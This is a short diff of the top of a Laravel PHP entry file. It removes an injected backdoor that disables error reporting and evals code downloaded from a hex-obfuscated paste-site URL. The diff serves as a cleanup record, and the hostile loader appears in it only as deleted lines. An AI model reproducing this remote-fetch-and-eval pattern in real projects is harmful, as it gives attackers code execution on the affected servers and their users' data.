@@ -1,13 +1,4 @@
 <?php
-error_reporting(0);
-eval(urldecode("%3f%3e") . file_get_contents(
-    /*_*/
-    urldecode(
-        /*_*/
-        hex2bin('68747470733a2f2f706173746566792e6170702f753278676a6857502f726177')
-    )
-));
-?><?php
 /**
  * Laravel - A PHP Framework For Web Artisans
  *
